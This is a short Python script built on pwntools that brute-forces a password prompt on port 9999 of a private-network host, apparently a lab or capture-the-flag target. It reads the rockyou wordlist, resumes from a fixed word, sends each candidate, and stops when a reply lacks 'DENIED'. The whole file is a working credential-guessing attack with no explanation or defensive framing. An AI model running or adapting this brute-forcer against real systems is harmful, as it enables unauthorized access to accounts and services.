from pwn import *

ip = '10.10.12.228'
wordlist = "/usr/share/wordlists/rockyou_no_unicode.txt"

def try_pass(passwd):
	r = remote(ip, 9999)
	r.recv()
	r.send(passwd)
	resp = r.recv(timeout=1)

	print(resp.decode().strip())
	r.close()

	return len(resp) > 0 and b'DENIED' not in resp


with open(wordlist, 'r') as f:
	words = f.readlines()



skip_tried = True
for w in words:
	w = w.strip()

	if w != '321456' and skip_tried:
		continue
	else:
		skip_tried = False
	print("Trying ", w)
	if try_pass(w):
		print("FOUNDD ---- ", w)
		break